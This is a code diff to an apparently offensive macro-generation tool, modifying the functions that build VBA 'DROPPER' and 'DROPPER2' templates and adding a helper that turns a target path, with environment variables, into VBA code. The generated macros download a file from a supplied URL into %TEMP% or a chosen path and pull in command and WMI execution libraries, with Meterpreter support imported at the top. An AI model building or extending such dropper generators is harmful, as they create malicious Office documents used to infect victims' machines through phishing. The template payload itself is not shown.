@@ -3,7 +3,7 @@
 
 # Only enabled on windows
 import shlex
-import os
+import os, re
 import logging
 from modules.mp_module import MpModule
 import vbLib.Meterpreter
@@ -62,26 +62,68 @@ class TemplateFactory(MpModule):
         logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
 
     
+    def _targetPathToVba(self, targetPath):
+        """
+        Modify target path to convert it to VBA code
+        Mostly environment variable management when needed
+        """
+        # remove escape carets
+        result = targetPath.replace("^%","%")
+        
+        # find environment variables in string
+        pattern = "%(.*?)%"
+
+        searchResult = re.search(pattern, result)
+        if searchResult:
+            substring = searchResult.group(1)
+            logging.debug("     [*] Found environment variable: " + substring) 
+            
+            strsplitted = result.split("%" + substring + "%")
+            result = 'Environ("%s")' % substring
+            if strsplitted[0] == "" and strsplitted[1]!="": # we need to apped value to environment variable
+                result = result + '\n    realPath = realPath &  "%s" ' % strsplitted[1]
+            elif strsplitted[0] != "" and strsplitted[1]=="": # we need to prepend value to environment variable
+                result = result + '\n    realPath = "%s" & realPath ' % strsplitted[0]
+            elif strsplitted[0] != "" and strsplitted[1]!="": # we need to prepend and append value to environment variable
+                result = result + '\n    realPath = "%s"  &  realPath & "%s"  ' % (strsplitted[0],strsplitted[1])
+        
+        else:
+            result = '"' + result + '"'
+
+        # If there is no path where puting the payload in %temp%
+        if "\\" not in result and "/" not in result:
+            logging.info("   [-] File will be dropped in %%temp%% as %s" % targetPath)
+            result = result + '\n    realPath = Environ("TEMP") & "\\" & realPath'
+        else:
+            logging.info("   [-] Dropped file will be saved in %s" % targetPath.replace("^%","%"))
+        
+        logging.debug("     [*] Generated vba code:" + result)
+        
+        return result
+    
+    
     def _processDropperTemplate(self):
         """ Generate DROPPER  template for VBA and VBS based """
         # Get required parameters
-        downloadPathKey = "File name in TEMP or full file path."
-        paramDict = OrderedDict([("target_url",None),(downloadPathKey,None)])      
-        self.fillInputParams(paramDict)
+        realPathKey = "File name in TEMP or full file path (environment variables can be used)."            
+        paramArray = [MPParam("target_url"),MPParam(realPathKey,optional=True)]  
+        self.fillInputParams2(paramArray)
+        downloadPath = getParamValue(paramArray, realPathKey)
+        targetUrl = getParamValue(paramArray, "target_url")
 
-        paramDict[downloadPathKey] = '"' + paramDict[downloadPathKey] + '"'
-        if "\\" not in paramDict[downloadPathKey] and "/" not in paramDict[downloadPathKey]:
-            paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'
+        # build target path
+        if downloadPath == "":
+            downloadPath =  utils.randomAlpha(8)  + os.path.splitext(targetUrl)[1]     
+        downloadPath = self._targetPathToVba(downloadPath)
 
         # Add required functions
         self.addVBLib(vbLib.WscriptExec)
         self.addVBLib(vbLib.WmiExec )
         self.addVBLib(vbLib.ExecuteCMDAsync )
         
-
         content = vbLib.templates.DROPPER
-        content = content.replace("<<<URL>>>", paramDict["target_url"])
-        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict[downloadPathKey])
+        content = content.replace("<<<URL>>>", targetUrl)
+        content = content.replace("<<<DOWNLOAD_PATH>>>", downloadPath)
         # generate random file name
         vbaFile = self.addVBAModule(content)
         
@@ -92,14 +134,16 @@ class TemplateFactory(MpModule):
     def _processDropper2Template(self):
         """ Generate DROPPER2 template for VBA and VBS based """
         # Get required parameters
-        downloadPathKey = "File name in TEMP or full file path."
-        paramDict = OrderedDict([("target_url",None),(downloadPathKey,None)])      
-        self.fillInputParams(paramDict)
+        realPathKey = "File name in TEMP or full file path (environment variables can be used)."            
+        paramArray = [MPParam("target_url"),MPParam(realPathKey,optional=True)]  
+        self.fillInputParams2(paramArray)
+        downloadPath = getParamValue(paramArray, realPathKey)
+        targetUrl = getParamValue(paramArray, "target_url")
 
-
-        paramDict[downloadPathKey] = '"' + paramDict[downloadPathKey] + '"'
-        if "\\" not in paramDict[downloadPathKey] and "/" not in paramDict[downloadPathKey]:
-            paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'
+        # build target path
+        if downloadPath == "":
+            downloadPath =  utils.randomAlpha(8)  + os.path.splitext(targetUrl)[1]    
+        downloadPath = self._targetPathToVba(downloadPath)
             
         # Add required functions
         self.addVBLib(vbLib.WscriptExec)
@@ -107,8 +151,8 @@ class TemplateFactory(MpModule):
         self.addVBLib(vbLib.ExecuteCMDAsync )
 
         content = vbLib.templates.DROPPER2
-        content = content.replace("<<<URL>>>", paramDict["target_url"])
-        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict[downloadPathKey])
+        content = content.replace("<<<URL>>>", targetUrl)
+        content = content.replace("<<<DOWNLOAD_PATH>>>", downloadPath)
         # generate random file name
         vbaFile = self.addVBAModule(content)
         
